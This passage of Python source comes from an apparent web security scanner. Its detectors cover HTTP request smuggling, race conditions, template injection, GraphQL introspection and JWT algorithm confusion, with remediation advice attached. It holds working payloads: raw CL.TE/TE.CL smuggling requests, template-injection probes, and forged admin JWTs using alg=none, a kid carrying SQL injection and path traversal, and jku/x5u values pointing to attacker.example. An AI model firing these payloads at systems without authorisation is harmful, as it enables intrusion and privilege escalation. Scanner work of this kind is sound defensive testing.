        "Host: {host}\r\n"
        "User-Agent: elengenix-zero-day\r\n"
        "Content-Length: {cl}\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "GET /smuggled HTTP/1.1\r\n"
        "Host: {host}\r\n"
        "\r\n"
    ),
    "te_cl_smuggle": (
        "POST / HTTP/1.1\r\n"
        "Host: {host}\r\n"
        "User-Agent: elengenix-zero-day\r\n"
        "Content-Length: 4\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "5c\r\n"
        "GPOST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 15\r\n\r\nhi\r\n"
        "0\r\n"
        "\r\n"
    ),
    "double_cl": (
        "POST / HTTP/1.1\r\n"
        "Host: {host}\r\n"
        "Content-Length: 0\r\n"
        "Content-Length: 44\r\n"
        "\r\n"
        "GET /double-cl HTTP/1.1\r\nHost: {host}\r\n\r\n"
    ),
    "te_obfuscated": (
        "POST / HTTP/1.1\r\n"
        "Host: {host}\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Transfer-Encoding: identity\r\n"
        "Content-Length: 4\r\n"
        "\r\n"
        "5c\r\n"
        "GPOST / HTTP/1.1\r\nHost: {host}\r\n\r\n"
        "0\r\n"
        "\r\n"
    ),
}


class HTTPSmugglingDetector:
    """Detect HTTP Request Smuggling via raw-socket CL.TE / TE.CL probes.

    Why raw sockets? Libraries like ``requests`` and ``aiohttp`` will *fix*
    conflicting Content-Length and Transfer-Encoding headers for us, hiding
    parsing differences. The detector opens a TCP (or TLS) socket, sends
    exactly the bytes we want, and inspects the response for tell-tale signs
    of parsing mismatch:

    * Multiple HTTP responses on one connection (smuggled request observed).
    * HTTP version differences between response and request.
    * 400 vs 200 behavior on conflicting headers.
    """

    name = "http_smuggling"

    SMUGGLING_EVIDENCE = [
        r"400 Bad Request",
        r"invalid request",
        r"ambiguous",
        r"conflicting",
        r"chunked encoding",
    ]

    def __init__(self, timeout: float = 5.0):
        self.timeout = timeout

    async def detect(self, target: str, *, context: Optional[Dict[str, Any]] = None) -> List[Finding]:
        """Run raw-socket smuggling probes.

        Args:
            target: URL (http or https).
            context: Optional dict (currently unused).

        Returns:
            Findings list.
        """
        from urllib.parse import urlparse
        parsed = urlparse(target)
        host = parsed.hostname or ""
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        scheme = parsed.scheme or "http"
        if not host:
            return []

        findings: List[Finding] = []
        for probe_name, template in SMUGGLING_PROBES.items():
            try:
                bytes_sent = template.format(host=host, cl=44)
            except KeyError:
                continue
            responses = await self._send_raw(host, port, scheme, bytes_sent)
            if not responses:
                continue
            finding = self._analyze(probe_name, target, bytes_sent, responses)
            if finding is not None:
                findings.append(finding)
        return findings

    async def _send_raw(
        self,
        host: str,
        port: int,
        scheme: str,
        payload: str,
    ) -> List[str]:
        """Open a raw socket and return the list of HTTP responses."""
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port, ssl=(scheme == "https")),
                timeout=self.timeout,
            )
        except (asyncio.TimeoutError, OSError) as e:
            logger.debug("smuggling socket open failed: %s", e)
            return []

        try:
            writer.write(payload.encode("latin-1", errors="replace"))
            await writer.drain()
            chunks: List[bytes] = []
            deadline = time.time() + self.timeout
            while True:
                remaining = deadline - time.time()
                if remaining <= 0:
                    break
                try:
                    chunk = await asyncio.wait_for(
                        reader.read(4096), timeout=remaining,
                    )
                except asyncio.TimeoutError:
                    break
                if not chunk:
                    break
                chunks.append(chunk)
                # Stop if we already saw two HTTP responses.
                if chunks and b"\r\n\r\n" in chunk and len(chunks) >= 2:
                    break
            data = b"".join(chunks).decode("latin-1", errors="replace")
        except (OSError, asyncio.IncompleteReadError) as e:
            logger.debug("smuggling read failed: %s", e)
            data = ""
        finally:
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:  # pragma: no cover - best effort
                pass
        # Split into HTTP messages (very rough — enough for heuristic).
        # Only split on a *response* status line at the start of a line, not
        # on incidental "Server: ...HTTP/x.y" headers.
        return [
            m.strip()
            for m in re.split(r"(?=(?:^|\r\n)HTTP/\d\.\d \d{3} )", data)
            if m.strip()
        ]

    def _analyze(
        self,
        probe_name: str,
        target: str,
        sent: str,
        responses: List[str],
    ) -> Optional[Finding]:
        if not responses:
            return None
        # Heuristic: more than one response -> smuggling signal.
        if len(responses) >= 2:
            return Finding(
                detector=self.name,
                title=f"HTTP smuggling: multiple responses on probe {probe_name}",
                severity=SeverityLevel.CRITICAL,
                vuln_class=VulnClass.HTTP_SMUGGLING,
                url=target,
                method="POST",
                payload=sent[:400],
                evidence=f"Received {len(responses)} HTTP responses on a single connection.",
                description=(
                    "The server replied with multiple HTTP responses to a "
                    "single crafted request, indicating that the front-end "
                    "and back-end disagree on how to delimit the body "
                    "(classic CL.TE / TE.CL smuggling)."
                ),
                remediation=(
                    "Normalize Transfer-Encoding and Content-Length at the "
                    "front-end; reject ambiguous requests."
                ),
                cwe=["CWE-444"],
                references=[
                    "https://portswigger.net/web-security/request-smuggling",
                    "https://httpwg.org/specs/rfc9112.html#message-framing",
                ],
                confidence=0.9,
                metadata={"probe": probe_name, "responses": len(responses)},
            )
        # Single response: look for 400 / 'ambiguous' / 'chunked encoding'.
        text = responses[0]
        if any(re.search(p, text, re.IGNORECASE) for p in self.SMUGGLING_EVIDENCE):
            return Finding(
                detector=self.name,
                title=f"HTTP smuggling indicator on probe {probe_name}",
                severity=SeverityLevel.MEDIUM,
                vuln_class=VulnClass.HTTP_SMUGGLING,
                url=target,
                method="POST",
                payload=sent[:400],
                evidence=text[:600],
                description=(
                    "Server returned an error mentioning ambiguous headers "
                    "or chunked encoding. Combined with the conflicting "
                    "CL/TE probes this suggests a parsing-mismatch vector."
                ),
                remediation="Enforce RFC-compliant request parsing at the edge.",
                cwe=["CWE-444"],
                confidence=0.5,
                metadata={"probe": probe_name},
            )
        return None


# ═══════════════════════════════════════════════════════════════════════════
#  5. RACE CONDITION / TOCTOU DETECTOR
# ═══════════════════════════════════════════════════════════════════════════


class RaceConditionDetector:
    """Time-of-check / time-of-use (TOCTOU) race-condition detector.

    Sends N parallel requests to a single endpoint, then compares:

    * Status codes (variation suggests a race window).
    * Response body length (variation suggests inconsistent state).
    * Response timing (large spread suggests lock contention).
    * Reflection of state-dependent fields (e.g. ``balance`` decreased twice).
    """

    name = "race_condition"

    def __init__(self, http: Optional[HTTPClient] = None):
        self.http = http or HTTPClient()

    async def detect(
        self,
        target: str,
        *,
        method: str = "POST",
        body: Optional[Any] = None,
        concurrency: int = 12,
        context: Optional[Dict[str, Any]] = None,
    ) -> List[Finding]:
        """Fire ``concurrency`` requests in parallel.

        Args:
            target: URL.
            method: HTTP method.
            body: Body to send (dict for JSON, str for raw).
            concurrency: Number of parallel requests (clamped to [2, 20]).
            context: Optional dict with ``headers``.

        Returns:
            Findings list (possibly empty).
        """
        context = context or {}
        headers = {"Content-Type": "application/json"}
        headers.update(context.get("headers") or {})
        concurrency = max(2, min(20, concurrency))

        async def _one() -> Optional[Dict[str, Any]]:
            return await self.http.async_request(
                method, target, headers=headers, json_body=body if isinstance(body, dict) else None,
                data=body if not isinstance(body, dict) else None,
            )

        results = await asyncio.gather(*[_one() for _ in range(concurrency)], return_exceptions=False)
        results = [r for r in results if r is not None]
        return self._analyze(target, method, concurrency, results)

    def _analyze(
        self,
        target: str,
        method: str,
        n: int,
        results: List[Dict[str, Any]],
    ) -> List[Finding]:
        if len(results) < 2:
            return []
        findings: List[Finding] = []
        statuses = collections.Counter(r.get("status", 0) for r in results)
        lengths = [r.get("length", 0) for r in results]
        timings = [r.get("elapsed_ms", 0.0) for r in results]
        bodies = [r.get("text", "") for r in results]

        unique_statuses = len(statuses)
        length_spread = max(lengths) - min(lengths)
        timing_spread = max(timings) - min(timings)

        if unique_statuses > 1:
            findings.append(Finding(
                detector=self.name,
                title=f"Race condition: status code diverged across {n} concurrent requests",
                severity=SeverityLevel.HIGH,
                vuln_class=VulnClass.RACE_CONDITION,
                url=target,
                method=method,
                evidence=f"status distribution: {dict(statuses)}",
                description=(
                    f"{unique_statuses} different status codes observed across "
                    f"{n} concurrent requests. The endpoint exhibits "
                    "non-deterministic behaviour under concurrency."
                ),
                remediation=(
                    "Wrap critical sections in locks / atomic transactions. "
                    "Use SELECT ... FOR UPDATE, optimistic concurrency "
                    "control, or compare-and-swap primitives."
                ),
                cwe=["CWE-362"],
                references=["https://owasp.org/www-community/vulnerabilities/TOCTOU_Race_Condition"],
                confidence=0.85,
                metadata={"status_distribution": dict(statuses)},
            ))

        if length_spread > 0 and max(lengths) > 0:
            rel = length_spread / max(lengths)
            if rel > 0.30:
                findings.append(Finding(
                    detector=self.name,
                    title="Race condition: response body diverged across concurrent requests",
                    severity=SeverityLevel.MEDIUM,
                    vuln_class=VulnClass.RACE_CONDITION,
                    url=target,
                    method=method,
                    evidence=(
                        f"length range {min(lengths)}..{max(lengths)} "
                        f"(spread={length_spread}, rel={rel:.2%})"
                    ),
                    description=(
                        "Response bodies varied in length by more than 30% "
                        "across parallel requests. Possible TOCTOU or "
                        "non-atomic state mutation."
                    ),
                    remediation="Use atomic state transitions; lock per-resource.",
                    cwe=["CWE-362"],
                    confidence=0.6,
                    metadata={"length_spread": length_spread},
                ))

        if timing_spread > 500:
            findings.append(Finding(
                detector=self.name,
                title="Race condition: large timing spread under load",
                severity=SeverityLevel.LOW,
                vuln_class=VulnClass.RACE_CONDITION,
                url=target,
                method=method,
                evidence=f"timing spread = {timing_spread:.0f} ms (min={min(timings):.0f}, max={max(timings):.0f})",
                description=(
                    "Timing varied by more than 500 ms across parallel "
                    "requests. May indicate lock contention or a race window."
                ),
                remediation="Audit locking strategy; consider async-safe primitives.",
                cwe=["CWE-362"],
                confidence=0.4,
                metadata={"timing_spread_ms": timing_spread},
            ))

        # Field-level race: scan response bodies for fields that should be
        # monotonic (balance, credits, attempts, retry_count).
        if bodies:
            field_race = self._field_race(bodies)
            if field_race:
                findings.append(Finding(
                    detector=self.name,
                    title=f"Race condition: state field '{field_race}' changed inconsistently",
                    severity=SeverityLevel.HIGH,
                    vuln_class=VulnClass.RACE_CONDITION,
                    url=target,
                    method=method,
                    evidence=f"Field '{field_race}' values: {field_race}",
                    description=(
                        "A state field (e.g. balance) is expected to move in "
                        "one direction per request. The parallel responses "
                        "show non-monotonic values, classic TOCTOU."
                    ),
                    remediation="Wrap state mutations in compare-and-swap or row locks.",
                    cwe=["CWE-362"],
                    confidence=0.85,
                    metadata={"field": field_race},
                ))
        return findings

    @staticmethod
    def _field_race(bodies: List[str]) -> Optional[str]:
        """Return the first numeric field whose values are non-monotonic."""
        candidates = ("balance", "credits", "amount", "attempts", "retries")
        for field in candidates:
            values: List[float] = []
            for body in bodies:
                m = re.search(rf'"{field}"\s*:\s*(-?\d+(?:\.\d+)?)', body)
                if m:
                    try:
                        values.append(float(m.group(1)))
                    except ValueError:
                        continue
            if len(values) >= 2:
                diffs = [values[i + 1] - values[i] for i in range(len(values) - 1)]
                # All differences should have the same sign if monotonic.
                signs = {math.copysign(1.0, d) for d in diffs if d != 0}
                if len(signs) > 1:
                    return field
        return None


# ═══════════════════════════════════════════════════════════════════════════
#  6. SERVER-SIDE TEMPLATE INJECTION DETECTOR
# ═══════════════════════════════════════════════════════════════════════════


SSTI_PROBES = [
    # (payload, expected reflection)
    ("{{7*7}}", "49"),
    ("${7*7}", "49"),
    ("#{7*7}", "49"),
    ("<%= 7*7 %>", "49"),
    ("{{7*'7'}}", "7777777"),
    ("${7*'7'}", "7777777"),
    ("{{config}}", "Config"),
    ("{{self}}", "TemplateReference"),
]

SSTI_ERROR_SIGNATURES = [
    r"jinja2\.exceptions\.(TemplateSyntaxError|UndefinedError|SecurityError)",
    r"Twig.{0,5}Error.{0,5}(Syntax|Runtime)",
    r"Freemarker.{0,5}template",
    r"Velocity.{0,5}Exception",
    r"Handlebars.{0,5}Exception",
    r"Mustache.{0,5}Exception",
    r"Smarty.{0,5}",
    r"ERB.{0,5}SyntaxError",
]


class SSTIDetector:
    """Server-Side Template Injection detector.

    Probes a target with arithmetic and reflection markers across multiple
    template engines. A successful template injection is *indicated* by:

    * The expected reflection (e.g. ``49`` from ``{{7*7}}``).
    * A stack trace mentioning the template engine.
    """

    name = "ssti"

    def __init__(self, http: Optional[HTTPClient] = None):
        self.http = http or HTTPClient()

    async def detect(self, target: str, *, context: Optional[Dict[str, Any]] = None) -> List[Finding]:
        """Run SSTI probes.

        Args:
            target: URL.
            context: Optional dict with ``headers``, ``param`` (the parameter
                name to inject into; defaults to ``q``), ``method`` (default
                ``GET``).

        Returns:
            Findings list.
        """
        context = context or {}
        method = context.get("method", "GET")
        param = context.get("param", "q")
        headers = context.get("headers") or {}
        findings: List[Finding] = []

        # Baseline response (without template markers) — needed to ensure the
        # reflection is really new.
        baseline = await self.http.async_request(method, target, headers=headers)
        if baseline is None:
            return findings
        baseline_text = baseline.get("text") or ""

        for payload, expected in SSTI_PROBES:
            kwargs: Dict[str, Any] = {"headers": headers}
            if method.upper() == "GET":
                kwargs["params"] = {param: payload}
            else:
                kwargs["json_body"] = {param: payload}
            resp = await self.http.async_request(method, target, **kwargs)
            if resp is None:
                continue
            text = resp.get("text") or ""
            findings.extend(self._analyze(target, param, payload, expected, baseline_text, text, resp))
        return findings

    def _analyze(
        self,
        target: str,
        param: str,
        payload: str,
        expected: str,
        baseline: str,
        text: str,
        resp: Dict[str, Any],
    ) -> List[Finding]:
        out: List[Finding] = []
        # Reflection in the new response (and not in baseline) is the
        # canonical signal.
        if expected in text and expected not in baseline:
            sev = SeverityLevel.CRITICAL
            for err in SSTI_ERROR_SIGNATURES:
                if re.search(err, text, re.IGNORECASE):
                    sev = SeverityLevel.CRITICAL
                    break
            out.append(Finding(
                detector=self.name,
                title=f"SSTI: payload {payload!r} reflected as {expected!r}",
                severity=sev,
                vuln_class=VulnClass.TEMPLATE_INJECTION,
                url=target,
                method=resp.get("_method", "GET"),
                parameter=param,
                payload=payload,
                evidence=f"Expected {expected!r} present in response.",
                description=(
                    f"Template engine evaluated the probe {payload!r} and "
                    f"produced {expected!r}. The endpoint is vulnerable to "
                    "Server-Side Template Injection."
                ),
                remediation=(
                    "Never pass user input to template engines. Use sandboxed "
                    "engines (e.g. Jinja2 SandboxedEnvironment) or strict "
                    "context-aware escaping."
                ),
                cwe=["CWE-94", "CWE-1336"],
                references=[
                    "https://portswigger.net/research/server-side-template-injection",
                    "https://owasp.org/www-community/attacks/Server_Side_Template_Injection",
                ],
                confidence=0.95,
                metadata={"engine_hint": _infer_engine(payload, text)},
            ))

        for err in SSTI_ERROR_SIGNATURES:
            if re.search(err, text, re.IGNORECASE):
                out.append(Finding(
                    detector=self.name,
                    title=f"SSTI: template engine stack trace ({err})",
                    severity=SeverityLevel.HIGH,
                    vuln_class=VulnClass.TEMPLATE_INJECTION,
                    url=target,
                    parameter=param,
                    payload=payload,
                    evidence=re.search(err, text, re.IGNORECASE).group(0),  # type: ignore[union-attr]
                    description=(
                        "Server returned a template engine error, exposing "
                        "the engine family. This is strong corroboration of "
                        "an SSTI surface."
                    ),
                    remediation="Disable template debug errors in production.",
                    cwe=["CWE-94", "CWE-209"],
                    confidence=0.7,
                ))
                break
        return out


def _infer_engine(payload: str, text: str) -> str:
    """Best-effort template engine identification from a payload / response."""
    if payload.startswith("{{") and ("jinja" in text.lower() or "mako" in text.lower()):
        return "jinja2"
    if payload.startswith("$") and ("freemarker" in text.lower() or "velocity" in text.lower()):
        return "freemarker"
    if payload.startswith("<%=") and ("erb" in text.lower() or "ruby" in text.lower()):
        return "erb"
    if payload.startswith("#{") and ("twig" in text.lower() or "smarty" in text.lower()):
        return "twig"
    return "unknown"


# ═══════════════════════════════════════════════════════════════════════════
#  7. GRAPHQL INTROSPECTION EXPLOITATION
# ═══════════════════════════════════════════════════════════════════════════


GRAPHQL_INTROSPECTION_QUERY = """
{
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      name
      kind
      fields {
        name
        isDeprecated
        deprecationReason
        args { name type { name kind ofType { name kind } } }
      }
    }
    directives { name args { name } }
  }
}
""".strip()


GRAPHQL_MUTATION_PROBE = """
mutation { __typename }
""".strip()

GRAPHQL_BATCH_PROBE = [
    {"query": "{__typename}"},
    {"query": "{__typename}"},
    {"query": "{__typename}"},
]

GRAPHQL_SUBSCRIPTION_PROBE = """
subscription { __typename }
""".strip()


class GraphQLIntrospectionDetector:
    """GraphQL schema discovery & exploitation helper.

    * Detects GraphQL endpoints via common paths.
    * Sends the introspection query; counts types / mutations / subscriptions.
    * Tests for batching (rate-limit bypass).
    * Tests for depth (DoS).
    * Looks for sensitive keywords inside the schema.
    """

    name = "graphql_introspection"

    GRAPHQL_PATHS = [
        "/graphql", "/v1/graphql", "/v2/graphql", "/api/graphql",
        "/query", "/gql", "/graphiql", "/graphql/console",
    ]

    SENSITIVE_KEYWORDS = [
        "password", "secret", "token", "credential",
        "ssn", "credit", "card", "cvv", "pin", "passport",
        "salary", "private", "admin", "role", "permission",
        "audit", "log", "debug", "internal", "user_id", "apikey",
    ]

    def __init__(self, http: Optional[HTTPClient] = None):
        self.http = http or HTTPClient()

    async def detect(self, target: str, *, context: Optional[Dict[str, Any]] = None) -> List[Finding]:
        """Run GraphQL discovery + introspection.

        Args:
            target: Base URL or full GraphQL URL.
            context: Optional dict with ``headers`` and ``endpoint`` (skips
                discovery).

        Returns:
            Findings list.
        """
        context = context or {}
        headers = context.get("headers") or {}
        endpoint = context.get("endpoint")
        findings: List[Finding] = []

        if not endpoint:
            endpoint = await self._discover_endpoint(target, headers=headers)
        if endpoint is None:
            return findings

        schema = await self._introspect(endpoint, headers=headers)
        if not schema:
            findings.append(Finding(
                detector=self.name,
                title="GraphQL endpoint reachable but introspection disabled",
                severity=SeverityLevel.INFO,
                vuln_class=VulnClass.GRAPHQL,
                url=endpoint,
                description=(
                    "A GraphQL endpoint is reachable but the introspection "
                    "query returned no schema. This is the secure default; "
                    "still verify that production queries are authZ'd."
                ),
                remediation="Keep introspection disabled in production.",
                confidence=0.8,
            ))
        else:
            findings.extend(self._analyze_schema(endpoint, schema))

        # Batching test
        batch_finding = await self._test_batching(endpoint, headers=headers)
        if batch_finding is not None:
            findings.append(batch_finding)

        # Depth test
        depth_finding = await self._test_depth(endpoint, headers=headers)
        if depth_finding is not None:
            findings.append(depth_finding)

        # Subscription / mutation probe
        for probe_name, query, severity in (
            ("subscription", GRAPHQL_SUBSCRIPTION_PROBE, SeverityLevel.LOW),
            ("mutation",     GRAPHQL_MUTATION_PROBE,    SeverityLevel.INFO),
        ):
            resp = await self.http.async_request(
                "POST", endpoint, headers=headers, json_body={"query": query},
            )
            if resp is None:
                continue
            text = (resp.get("text") or "").lower()
            if "__typename" in text and "errors" not in text:
                findings.append(Finding(
                    detector=self.name,
                    title=f"GraphQL {probe_name} type exposed",
                    severity=severity,
                    vuln_class=VulnClass.GRAPHQL,
                    url=endpoint,
                    evidence=text[:200],
                    description=(
                        f"GraphQL endpoint responds to {probe_name} __typename "
                        "queries, confirming the type is exposed."
                    ),
                    remediation=f"Restrict {probe_name} access via authZ.",
                    confidence=0.7,
                ))
        return findings

    async def _discover_endpoint(self, base_url: str, *, headers: Dict[str, str]) -> Optional[str]:
        for path in self.GRAPHQL_PATHS:
            url = base_url.rstrip("/") + path
            resp = await self.http.async_request(
                "POST", url, headers=headers, json_body={"query": "{__typename}"},
            )
            if resp is None:
                continue
            text = (resp.get("text") or "")
            status = resp.get("status", 0)
            if status == 200 and "__typename" in text:
                return url
            if status in (400, 405) and "json" in (resp.get("headers") or {}).get("Content-Type", ""):
                return url
        return None

    async def _introspect(self, endpoint: str, *, headers: Dict[str, str]) -> Optional[Dict[str, Any]]:
        resp = await self.http.async_request(
            "POST", endpoint, headers=headers, json_body={"query": GRAPHQL_INTROSPECTION_QUERY},
        )
        if resp is None or resp.get("status") != 200:
            return None
        try:
            payload = json.loads(resp.get("text") or "")
        except json.JSONDecodeError:
            return None
        return payload.get("data", {}).get("__schema")

    def _analyze_schema(self, endpoint: str, schema: Dict[str, Any]) -> List[Finding]:
        out: List[Finding] = []
        types = schema.get("types", []) or []
        mutation = schema.get("mutationType")
        subscription = schema.get("subscriptionType")

        out.append(Finding(
            detector=self.name,
            title="GraphQL introspection enabled — full schema exposed",
            severity=SeverityLevel.HIGH,
            vuln_class=VulnClass.GRAPHQL,
            url=endpoint,
            evidence=(
                f"types={len(types)}, has_mutation={bool(mutation)}, "
                f"has_subscription={bool(subscription)}"
            ),
            description=(
                "GraphQL introspection is enabled, exposing the entire schema. "
                "This allows an attacker to enumerate every query, mutation, "
                "and field — a major information disclosure."
            ),
            remediation="Disable introspection in production.",
            cwe=["CWE-200"],
            confidence=0.95,
        ))

        deprecated: List[str] = []
        sensitive_hits: List[Tuple[str, str, str]] = []  # (type, field, keyword)
        for t in types:
            fields = t.get("fields") or []
            for f in fields:
                fname = f.get("name", "")
                if f.get("isDeprecated"):
                    deprecated.append(f"{t.get('name')}.{fname}")
                low = fname.lower()
                for kw in self.SENSITIVE_KEYWORDS:
                    if kw in low:
                        sensitive_hits.append((t.get("name", ""), fname, kw))
                        break

        if sensitive_hits:
            sample = ", ".join(f"{t}.{f}" for t, f, _ in sensitive_hits[:5])
            out.append(Finding(
                detector=self.name,
                title=f"Sensitive fields exposed via introspection ({len(sensitive_hits)})",
                severity=SeverityLevel.HIGH,
                vuln_class=VulnClass.SENSITIVE_DATA,
                url=endpoint,
                evidence=sample,
                description=(
                    "Schema exposes fields whose names suggest sensitive data "
                    "(passwords, tokens, roles, etc.)."
                ),
                remediation="Rename or remove sensitive fields; ensure authZ.",
                cwe=["CWE-200", "CWE-359"],
                confidence=0.8,
                metadata={"sensitive_count": len(sensitive_hits)},
            ))

        if deprecated:
            out.append(Finding(
                detector=self.name,
                title=f"{len(deprecated)} deprecated fields still queryable",
                severity=SeverityLevel.LOW,
                vuln_class=VulnClass.GRAPHQL,
                url=endpoint,
                evidence=", ".join(deprecated[:5]),
                description="Deprecated fields remain accessible via the schema.",
                remediation="Remove deprecated fields.",
                confidence=0.9,
                metadata={"count": len(deprecated)},
            ))
        return out

    async def _test_batching(self, endpoint: str, *, headers: Dict[str, str]) -> Optional[Finding]:
        resp = await self.http.async_request(
            "POST", endpoint, headers=headers, json_body=GRAPHQL_BATCH_PROBE,
        )
        if resp is None or resp.get("status") != 200:
            return None
        try:
            data = json.loads(resp.get("text") or "")
        except json.JSONDecodeError:
            return None
        if isinstance(data, list) and len(data) >= 2:
            return Finding(
                detector=self.name,
                title="GraphQL batching enabled — rate-limit bypass possible",
                severity=SeverityLevel.MEDIUM,
                vuln_class=VulnClass.GRAPHQL,
                url=endpoint,
                evidence=f"Batch response length: {len(data)}",
                description=(
                    "Server accepted an array of queries in a single HTTP "
                    "request, enabling rate-limit bypass and brute-force "
                    "amplification."
                ),
                remediation="Disable batching or enforce per-query rate limits.",
                cwe=["CWE-770"],
                confidence=0.85,
            )
        return None

    async def _test_depth(self, endpoint: str, *, headers: Dict[str, str]) -> Optional[Finding]:
        depth_query = "query { " + " ".join(["__typename"] * 20) + " }"
        resp = await self.http.async_request(
            "POST", endpoint, headers=headers, json_body={"query": depth_query},
        )
        if resp is None:
            return None
        if resp.get("status") == 200 and "__typename" in (resp.get("text") or ""):
            return Finding(
                detector=self.name,
                title="GraphQL depth limit not enforced — DoS vector",
                severity=SeverityLevel.MEDIUM,
                vuln_class=VulnClass.GRAPHQL,
                url=endpoint,
                evidence=resp.get("text", "")[:200],
                description="Server accepted a 20-typename query without truncation.",
                remediation="Enforce query depth and complexity limits.",
                cwe=["CWE-770"],
                confidence=0.7,
            )
        return None


# ═══════════════════════════════════════════════════════════════════════════
#  8. JWT ALGORITHM CONFUSION DETECTOR
# ═══════════════════════════════════════════════════════════════════════════


def _b64url(data: bytes) -> str:
    """Base64-url encode without padding."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _b64url_decode(text: str) -> bytes:
    """Base64-url decode with padding restored."""
    pad = "=" * (-len(text) % 4)
    return base64.urlsafe_b64decode(text + pad)


def _make_jwt(header: Dict[str, Any], payload: Dict[str, Any], signature: str = "") -> str:
    """Build a JWT string from components."""
    h = _b64url(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}.{signature}"


def _is_jwt(token: str) -> bool:
    """Quick structural check: three '.'-separated parts, second part non-empty."""
    if not token or not isinstance(token, str):
        return False
    parts = token.split(".")
    if len(parts) != 3:
        return False
    # Header and payload must be non-empty; signature may be empty (alg=none).
    return bool(parts[0]) and bool(parts[1])


class JWTAlgorithmDetector:
    """JWT algorithm-confusion detector.

    Generates attack JWTs locally (no server interaction required for the
    forgery part) and, when ``http`` is provided, also probes the token
    verification endpoint for acceptance.
    """

    name = "jwt_algorithm_confusion"

    CONFUSION_PAYLOAD: Dict[str, Any] = {
        "user": "admin",
        "role": "admin",
        "sub": "1",
        "iat": int(time.time()),
        "exp": int(time.time()) + 3600,
    }

    def __init__(self, http: Optional[HTTPClient] = None):
        self.http = http or HTTPClient()

    def forge_tokens(self, original_token: Optional[str] = None) -> Dict[str, str]:
        """Generate JWT forgery variants.

        Args:
            original_token: Optional original JWT to mimic the structure of.

        Returns:
            Dict mapping attack name to forged JWT.
        """
        if original_token and _is_jwt(original_token):
            try:
                _, payload_b64, _ = original_token.split(".")
                base_payload = json.loads(_b64url_decode(payload_b64))
            except (ValueError, json.JSONDecodeError):
                base_payload = dict(self.CONFUSION_PAYLOAD)
        else:
            base_payload = dict(self.CONFUSION_PAYLOAD)
        base_payload.update(self.CONFUSION_PAYLOAD)

        attacks: Dict[str, str] = {}
        # 1. alg=none
        attacks["alg_none"] = _make_jwt({"alg": "none", "typ": "JWT"}, base_payload, "")
        attacks["alg_NONE"] = _make_jwt({"alg": "NONE", "typ": "JWT"}, base_payload, "")
        attacks["alg_none_no_typ"] = _make_jwt({"alg": "none"}, base_payload, "")
        # 2. kid injection
        attacks["kid_path_traversal"] = _make_jwt(
            {"alg": "HS256", "kid": "../../../dev/null", "typ": "JWT"},
            base_payload,
            _b64url(b"")  # signature will fail HMAC verify if checked
        )
        attacks["kid_sql_injection"] = _make_jwt(
            {"alg": "HS256", "kid": "1' OR '1'='1", "typ": "JWT"},
            base_payload,
            _b64url(b"")
        )
        attacks["kid_blank"] = _make_jwt(
            {"alg": "HS256", "kid": "", "typ": "JWT"}, base_payload, _b64url(b""),
        )
        # 3. jku / x5u confusion — the server fetches the key from URL.
        attacks["jku_attack"] = _make_jwt(
            {
                "alg": "RS256",
                "jku": "https://attacker.example/jwks.json",
                "kid": "key-1",
                "typ": "JWT",
            },
            base_payload,
            _b64url(b"")
        )
        attacks["x5u_attack"] = _make_jwt(
            {
                "alg": "RS256",
                "x5u": "https://attacker.example/cert.pem",
                "typ": "JWT",
            },
            base_payload,
            _b64url(b"")
        )
        # 4. HS256-with-RSA-public-key (algorithm confusion classic)
        # We don't know the key, so we just generate a random HMAC signature.
        # The token is forged so callers can compare responses.
        fake_sig = _b64url(hashlib.sha256(b"elengenix-rs256-hs256-confusion").digest())
        attacks["hs256_confusion"] = _make_jwt(
            {"alg": "HS256", "typ": "JWT"}, base_payload, fake_sig,
        )
        return attacks

    def detect(self, token: Optional[str] = None) -> List[Finding]:
        """Static detection (no HTTP) — produces candidates that must be tested live.

        IMPORTANT: These are FORGERY CANDIDATES, not confirmed vulnerabilities.
        The server has NOT been tested. To confirm, use ``detect_on_endpoint()``
        which sends each forged token and checks response status.

        Args:
            token: Optional original JWT to mimic.

        Returns:
            Findings list (one per attack). All marked as Medium confidence.
        """
        attacks = self.forge_tokens(token)
        findings: List[Finding] = []
        for name, forged in attacks.items():
            sev = (
                SeverityLevel.CRITICAL
                if name.startswith("alg_none") or name == "hs256_confusion"
                else SeverityLevel.HIGH
                if "kid" in name
                else SeverityLevel.MEDIUM
            )
            findings.append(Finding(
                detector=self.name,
                title=f"JWT forgery CANDIDATE (not tested): {name}",
                severity=sev,
                vuln_class=VulnClass.JWT,
                payload=forged[:80] + "...",
                evidence=forged,
                description=(
                    f"Forged JWT with attack pattern '{name}'. This is a "
                    f"STATIC CANDIDATE — server has NOT been tested. Use "
                    f"`detect_on_endpoint()` or run live scan to confirm "
                    f"whether the verifier accepts this token."
                ),
                remediation=(
                    "Reject alg=none. Pin the expected algorithm. Never use "
                    "the public key as an HMAC secret. Validate kid, jku, "
                    "x5u against an allowlist."
                ),
                cwe=["CWE-347", "CWE-287"],
                references=[
                    "https://portswigger.net/web-security/jwt/algorithm-confusion",
                    "https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/",
                ],
                confidence=0.0,  # Static-only — 0 confidence until server is tested.
                metadata={"attack": name, "tested": False, "static": True},
            ))
        return findings

    async def detect_on_endpoint(
        self,
        endpoint: str,
        *,
        original_token: Optional[str] = None,
        context: Optional[Dict[str, Any]] = None,
    ) -> List[Finding]:
        """Send forged tokens to ``endpoint`` and look for acceptance.

        Args:
            endpoint: URL that accepts JWTs (typically in Authorization header).
            original_token: Optional original JWT to mimic.
            context: Optional dict with ``headers`` (sent with every probe) and
                ``auth_header`` template (default ``"Bearer {token}"``).

        Returns:
            Findings list.
        """
        context = context or {}
        base_headers = context.get("headers") or {}
        auth_template = context.get("auth_header", "Bearer {token}")
        attacks = self.forge_tokens(original_token)
        findings: List[Finding] = []

        # Establish baseline
        baseline = await self.http.async_request(
            "GET", endpoint, headers=base_headers,
        )
        baseline_status = (baseline or {}).get("status", 0)

        for name, forged in attacks.items():
            headers = dict(base_headers)
            headers["Authorization"] = auth_template.format(token=forged)
